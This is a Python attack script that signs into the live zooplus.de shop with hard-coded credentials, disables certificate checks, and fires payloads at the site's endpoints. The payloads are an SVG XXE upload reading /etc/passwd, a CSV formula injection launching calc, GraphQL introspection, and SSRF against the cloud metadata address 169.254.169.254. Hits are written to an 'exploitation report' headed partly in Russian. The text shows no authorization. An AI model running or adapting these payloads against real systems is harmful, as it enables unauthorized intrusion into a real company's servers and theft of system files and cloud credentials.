#!/usr/bin/env python3
"""Test extracted endpoints for vulnerabilities"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

found_vulns = []

# Load extracted endpoints
try:
    with open("reports/extracted_endpoints.json", "r") as f:
        data = json.load(f)
        endpoints = data.get("endpoints", [])
    print(f"\n[*] Testing {len(endpoints)} extracted endpoints...")
except:
    endpoints = []
    print("[!] No extracted endpoints file")

# Test each endpoint
for ep in endpoints:
    if not ep.startswith('/'):
        continue
    
    # Skip known safe endpoints
    if any(x in ep for x in ['_next', 'static', 'chunks', '.css', '.js', '.png', '.jpg']):
        continue
    
    # Test GraphQL
    if 'graphql' in ep.lower():
        try:
            resp = s.post(f"{base}{ep}", json={"query": "{__schema{types{name}}}"}, timeout=3, verify=False)
            if resp.status_code == 200:
                if '__schema' in resp.text:
                    print(f"  [CRITICAL] GraphQL: {ep}")
                    found_vulns.append({"type": "graphql_introspection", "severity": "CRITICAL", "endpoint": ep})
        except: pass
    
    # Test Upload
    if 'upload' in ep.lower():
        # SVG XXE
        svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
        try:
            files = {'file': ('x.svg', svg_xxe, 'image/svg+xml')}
            resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
            if resp.status_code in [200, 201, 302]:
                if "root:" in resp.text:
                    print(f"  [CRITICAL] SVG XXE: {ep}")
                    found_vulns.append({"type": "svg_xxe", "severity": "CRITICAL", "endpoint": ep})
                elif resp.headers.get('Location'):
                    loc = resp.headers.get('Location')
                    resp2 = s.get(loc if loc.startswith('http') else f"{base}{loc}", timeout=2, verify=False)
                    if "root:" in resp2.text:
                        print(f"  [CRITICAL] SVG XXE via file: {ep}")
                        found_vulns.append({"type": "svg_xxe", "severity": "CRITICAL", "endpoint": ep, "location": loc})
        except: pass
    
    # Test Import
    if 'import' in ep.lower():
        csv_payload = "=cmd|'/c calc'!A0"
        try:
            files = {'file': ('x.csv', csv_payload, 'text/csv')}
            resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
            if resp.status_code in [200, 201]:
                print(f"  [HIGH] CSV import: {ep}")
                if "calc" in resp.text.lower():
                    print(f"  [CRITICAL] CSV injection: {ep}")
                    found_vulns.append({"type": "csv_injection", "severity": "CRITICAL", "endpoint": ep})
        except: pass

# Test known state-api for other vectors
print("\n[*] Testing state-api for other vectors...")
state_endpoint = "/semiprotected/api/checkout/state-api/v2/get"

# Try SSRF
try:
    resp = s.post(f"{base}{state_endpoint}", json={"url": "http://169.254.169.254/latest/meta-data/"}, timeout=2, verify=False)
    if resp.status_code in [200, 400] and len(resp.text) > 50:
        if "metadata" in resp.text.lower():
            print(f"  [CRITICAL] SSRF in state-api/get")
            found_vulns.append({"type": "ssrf", "severity": "CRITICAL", "endpoint": state_endpoint})
except: pass

# SUMMARY
print("\n" + "=" * 70)
print("VULNERABILITIES")
print("=" * 70)

if found_vulns:
    for v in found_vulns:
        print(f"\n[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ УЯЗВИМОСТИ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Status:** Подтверждено\n\n")
            if 'location' in v:
                f.write(f"**Uploaded to:** `{v['location']}`\n\n")
            f.write("---\n\n")
    
    print(f"\n[+] Report updated")
else:
    print("  No vulnerabilities found")

print("=" * 70)

